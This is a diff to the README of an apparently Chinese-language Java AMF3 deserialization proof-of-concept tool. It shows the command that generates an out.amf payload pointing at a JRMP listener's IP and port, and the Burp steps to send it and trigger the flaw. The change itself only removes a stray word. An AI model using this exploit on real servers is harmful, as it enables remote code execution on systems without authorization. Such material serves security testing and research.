@@ -16,6 +16,6 @@ java -jar AMFpoc_JRMP.jar 起服务的ip 起服务的端口
 ```bash
 java -jar AMFpoc_JRMP.jar 114.114.114.114 1234
 ```
-他会生成一个out.amf,使用burp右键选择pasted from file，选这个out.amf发送就可以触发evee
+他会生成一个out.amf,使用burp右键选择pasted from file，选这个out.amf发送就可以触发
 
 https://www.mi1k7ea.com/2019/12/07/Java-AMF3反序列化漏洞/
